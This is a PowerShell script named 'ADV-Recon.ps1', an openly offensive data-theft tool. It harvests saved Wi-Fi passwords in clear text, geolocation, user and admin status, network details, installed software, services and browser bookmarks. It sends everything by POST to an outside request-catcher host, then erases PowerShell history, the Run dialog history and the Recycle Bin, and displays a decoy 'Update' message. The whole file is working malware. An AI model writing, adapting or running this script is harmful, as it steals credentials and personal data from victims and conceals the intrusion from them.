# =================== ADV-Recon.ps1 – Data Exfiltration via POST ===================

$output = ""

function Add-ToOutput {
    param([string]$Title, [string]$Data)
    $output += "`n===== [$Title] =====`n"
    $output += "$Data`n"
}

# --- Powershell & User Info ---
Add-ToOutput "PowerShell Version" $PSVersionTable.PSVersion
Add-ToOutput "Current User" (whoami)
$admin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)
Add-ToOutput "Is Admin?" $admin

# --- Microsoft Account Info ---
try {
    $fullName = (Get-LocalUser -Name $env:USERNAME).FullName
} catch {
    $fullName = $env:USERNAME
}
Add-ToOutput "Full Name" $fullName

try {
    $email = (Get-CimInstance CIM_ComputerSystem).PrimaryOwnerName
} catch {
    $email = "Not found"
}
Add-ToOutput "Email" $email

# --- GeoLocation (if permitted) ---
try {
    Add-Type -AssemblyName System.Device
    $Geo = New-Object System.Device.Location.GeoCoordinateWatcher
    $Geo.Start()
    while (($Geo.Status -ne 'Ready') -and ($Geo.Permission -ne 'Denied')) { Start-Sleep -Milliseconds 100 }
    if ($Geo.Permission -eq 'Denied') {
        Add-ToOutput "GeoLocation" "Access Denied"
    } else {
        $loc = $Geo.Position.Location
        Add-ToOutput "GeoLocation" "Latitude: $($loc.Latitude), Longitude: $($loc.Longitude)"
    }
} catch {
    Add-ToOutput "GeoLocation" "Error"
}

# --- UAC Status ---
function Get-RegistryValue($key, $value) { (Get-ItemProperty $key $value).$value }
$Key = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
$UAC1 = Get-RegistryValue $Key "ConsentPromptBehaviorAdmin"
$UAC2 = Get-RegistryValue $Key "PromptOnSecureDesktop"
Add-ToOutput "UAC Settings" "ConsentPrompt: $UAC1, SecureDesktop: $UAC2"

# --- RDP Status ---
try {
    $rdp = Get-ItemProperty "HKLM:\System\CurrentControlSet\Control\Terminal Server"
    $rdpEnabled = $rdp.fDenyTSConnections -eq 0
    Add-ToOutput "RDP Enabled" $rdpEnabled
} catch {
    Add-ToOutput "RDP Enabled" "Error"
}

# --- Network Info ---
try {
    $publicIP = Invoke-RestMethod -Uri "https://api.ipify.org"
} catch {
    $publicIP = "Unavailable"
}
Add-ToOutput "Public IP" $publicIP

$localIP = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object {$_.InterfaceAlias -notlike "*Loopback*" -and $_.IPAddress -notlike "169.*"} | Select-Object -ExpandProperty IPAddress) -join ", "
Add-ToOutput "Local IP" $localIP

try {
    $macs = Get-NetAdapter | Select Name, MacAddress, Status | Format-Table | Out-String
    Add-ToOutput "MAC Addresses" $macs
} catch {
    Add-ToOutput "MAC Addresses" "Error"
}

# --- Wi-Fi Profiles & Passwords ---
try {
    $wifiProfiles = netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object {
        ($_ -split ":")[1].Trim()
    }
    $wifiData = ""
    foreach ($profile in $wifiProfiles) {
        $wifiData += "`n[$profile]`n"
        $wifiData += (netsh wlan show profile name="$profile" key=clear | Select-String "Key Content") -join "`n"
    }
    Add-ToOutput "Saved Wi-Fi Profiles" $wifiData
} catch {
    Add-ToOutput "Saved Wi-Fi Profiles" "Access Denied or Error"
}

# --- Nearby Wi-Fi Networks ---
try {
    $nearby = netsh wlan show networks mode=Bssid | ?{$_ -like "SSID*" -or $_ -like "*Authentication*" -or $_ -like "*Encryption*"} | Out-String
    Add-ToOutput "Nearby Wi-Fi Networks" $nearby
} catch {
    Add-ToOutput "Nearby Wi-Fi Networks" "Unavailable"
}

# --- System Info ---
try {
    $sys = Get-CimInstance Win32_ComputerSystem
    $bios = Get-CimInstance Win32_BIOS
    $os = Get-CimInstance Win32_OperatingSystem
    $cpu = Get-WmiObject Win32_Processor | Select Name, Manufacturer, MaxClockSpeed | Format-List | Out-String
    $ram = Get-WmiObject Win32_PhysicalMemory | Measure-Object -Property Capacity -Sum | % { "{0:N1} GB" -f ($_.sum / 1GB) }

    Add-ToOutput "System Manufacturer" $sys.Manufacturer
    Add-ToOutput "Model" $sys.Model
    Add-ToOutput "RAM Installed" $ram
    Add-ToOutput "OS" "$($os.Caption) $($os.Version)"
    Add-ToOutput "Serial Number" $bios.SerialNumber
    Add-ToOutput "CPU Info" $cpu
} catch {
    Add-ToOutput "System Info" "Error"
}

# --- Local Users ---
try {
    $users = Get-LocalUser | Select Name, Enabled | Format-Table | Out-String
    Add-ToOutput "Local Users" $users
} catch {
    Add-ToOutput "Local Users" "Error"
}

# --- Running Processes ---
try {
    $procs = Get-Process | Select-Object -First 15 | Format-Table Name, Id, CPU | Out-String
    Add-ToOutput "Top Processes" $procs
} catch {
    Add-ToOutput "Processes" "Error"
}

# --- Network Connections ---
try {
    $netstat = netstat -n | Select-String "TCP"
    Add-ToOutput "TCP Connections" ($netstat -join "`n")
} catch {
    Add-ToOutput "Network Connections" "Error"
}

# --- Installed Software ---
try {
    $software = Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Where-Object {$_.DisplayName} | Select DisplayName, DisplayVersion | Sort DisplayName | Format-Table | Out-String
    Add-ToOutput "Installed Software" $software
} catch {
    Add-ToOutput "Installed Software" "Error"
}

# --- Services ---
try {
    $services = Get-WmiObject win32_service | Select Name, State, StartMode | Sort Name | Format-Table | Out-String
    Add-ToOutput "Services" $services
} catch {
    Add-ToOutput "Services" "Error"
}

# --- HDD Info ---
try {
    $drives = Get-WmiObject Win32_LogicalDisk | Select DeviceID, VolumeName, FileSystem, @{Name="Size(GB)";Expression={"{0:N1}" -f ($_.Size / 1GB)}}, @{Name="Free(GB)";Expression={"{0:N1}" -f ($_.FreeSpace / 1GB)}} | Format-Table | Out-String
    Add-ToOutput "Drives" $drives
} catch {
    Add-ToOutput "Drive Info" "Error"
}

# --- Browser Bookmarks and History (Basic) ---
$regex = '(http|https):\/\/[^\s"]+'
$browserData = ""
$paths = @(
    "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Bookmarks",
    "$Env:USERPROFILE\AppData\Local\Microsoft\Edge\User Data\Default\Bookmarks"
)
foreach ($p in $paths) {
    if (Test-Path $p) {
        try {
            $raw = Get-Content -Raw $p
            $urls = [regex]::Matches($raw, $regex) | ForEach-Object { $_.Value } | Sort-Object -Unique
            $browserData += "`n$p:`n" + ($urls -join "`n")
        } catch {
            $browserData += "`n$p: Error reading file"
        }
    }
}
Add-ToOutput "Browser Bookmarks (Raw URL Extract)" $browserData

# --- Final Exfiltration ---
try {
    Invoke-WebRequest -Uri "https://flipped.requestcatcher.com/" -Method POST -Body @{data = $output} -UseBasicParsing
} catch {
    Add-ToOutput "EXFIL STATUS" "Failed to send"
}

# --- Optional cleanup ---
Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue
reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f -ErrorAction SilentlyContinue
Clear-RecycleBin -Force -ErrorAction SilentlyContinue

# --- Finished marker ---
[System.Windows.Forms.MessageBox]::Show("Recon Complete", "Update")
